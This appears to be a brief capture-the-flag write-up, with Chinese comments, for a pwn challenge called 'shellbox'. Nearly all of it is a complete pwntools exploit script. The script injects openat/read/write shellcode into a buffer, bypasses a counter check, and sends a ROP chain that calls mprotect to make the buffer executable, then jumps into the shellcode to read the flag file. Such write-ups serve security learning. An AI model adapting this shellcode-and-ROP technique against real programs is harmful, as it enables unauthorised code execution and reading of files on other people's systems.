# shellbox

buf里输入openat+read+write的shellcode，然后用rop调用mprotect修改buf的权限并跳转到shellcode
```py
from pwn import *
context.arch='amd64'
exe=ELF('./pwn')
p=remote("localhost",39911)
rdi=0x0000000000401a40
rsi=0x0000000000401a42
rdx=0x0000000000401a44
filename=b"./flag\x00"
shellcode=asm(f"""
mov rax,257
mov rdi,-100
mov rsi,{exe.sym['buf']}
mov rdx,0
syscall

mov rax,0
mov rdi,3
mov rsi,{exe.sym['buf']+0x100}
mov rdx,100
syscall

mov rax,1
mov rdi,1
mov rsi,{exe.sym['buf']+0x100}
mov rdx,100
syscall
""")
p.sendlineafter(".",filename+shellcode)
payload=p64(rdi)+p64(0x004ce000)+p64(rsi)+p64(0x1000)+p64(rdx)+p64(7)+p64(exe.sym['mprotect'])+p64(exe.sym['buf']+len(filename)) #注意mprotect的地址需要页(0x1000)对齐
p.sendafter(">",b'a'*4+p32(1)) #绕过`if (counter == 1)`的限制
for i in range(0,len(payload),8):
    p.sendafter(">",payload[i:i+8])
p.interactive()
```